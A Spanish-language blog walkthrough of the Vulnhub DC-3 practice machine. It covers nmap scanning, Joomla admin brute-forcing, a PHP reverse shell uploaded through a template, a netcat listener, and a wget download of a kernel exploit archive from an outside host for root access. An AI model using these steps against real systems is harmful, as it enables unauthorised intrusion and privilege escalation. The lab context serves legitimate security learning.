---
title: Vulnhub DC-3
published: true
---
**Resolucion de la maquina DC-3 de Vulnhub**


[Link al ejercicio](https://www.vulnhub.com/entry/dc-32,312/).

Hoy vamos a resolver la Maquina DC-3 de Vulnhub

Al igual que en la [primera](VulnHub-DC-1) y [segunda](Vulnhub-DC-2), lo primero es ver que ip tiene la maquina. Una vez lo hayamos hecho, vamos a realizar un escaneo de puertos con nmap para ver que puertos tenemos abiertos en la maquina.

## Escaneo de puertos

```bash
nmap -sV -A 10.0.74.59
```

![](/assets/vulnhub/dc-3/1.png)

Podemos ver que tiene el puerto 80 abierto, con un servidor Joomla. Asi que vamos a intentar explotar sus vulnerabilidades.

```bash
sudo nmap -sV -A --script http-joomla-brute 10.0.74.59
```

![](/assets/vulnhub/dc-3/4.png)

Vamos a usar las credenciales del admin para entrar al web admin.

![](/assets/vulnhub/dc-3/5.png)

Ahora nos vamos a ir a templates y vamos a usar el que se llama protostar. Este template tiene una vulnerabilidad que nos permite ejecutar codigo remoto.

![](/assets/vulnhub/dc-3/6.png)

Vamos a crear un archivo php con el codigo del siguiente archivo.

![](/assets/vulnhub/dc-3/9.png)

Hay que cambiar la ip por la nuestra y subirlo al servidor.

![](/assets/vulnhub/dc-3/11.png)


Ahora vamos a usar netcat para poner el puerto en esucha.

```bash
nc -lvp 1234
```

![](/assets/vulnhub/dc-3/12.png)

Ahora vamos a ejecutar el archivo que hemos subido al servidor.Para ello, vamos a la siguiente url.

![](/assets/vulnhub/dc-3/13.png)

Una vez que hagamos esto, veremos que estamos dentro de la maquina. Vamos a usar el comando uname -a para ver que sistema operativo es.

![](/assets/vulnhub/dc-3/14.png)


En esta parte me he estado volviendome loco, proque el repositorio remoto donde esta el exploit que necesitamos para escalar privilegios, ya no esta disponible. Re sulta que el dueño, ha cambiado de Github a Gitlab. 

![](/assets/vulnhub/dc-3/15.png)

![](/assets/vulnhub/dc-3/16.png)

Pero finalmente he conseguido localizar el [archivo](https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/blob/main/bin-sploits/39772.zip).

![](/assets/vulnhub/dc-3/17.png)


Antes de instalarlo, vamos a importar un interprete /bin/bash para que sea mas comodo trabajar con la shell.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
Ahora ya podemos descargarlo y descomprimirlo.

```bash
wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/blob/main/bin-sploits/39772.zip
unzip 39772.zip
```

![](/assets/vulnhub/dc-3/21.png)

![](/assets/vulnhub/dc-3/22.png)

Ahora accedemos a la carpeta y seguimos los pasos de las capturas.

![](/assets/vulnhub/dc-3/23.png)

![](/assets/vulnhub/dc-3/24.png)

![](/assets/vulnhub/dc-3/25.png)

Esto basicamente es un exploit que nos otorga priviligios de root. Asi que ahora ya podemos ver el contenido del archivo flag.txt.

![](/assets/vulnhub/dc-3/26.png)

![](/assets/vulnhub/dc-3/27.png)

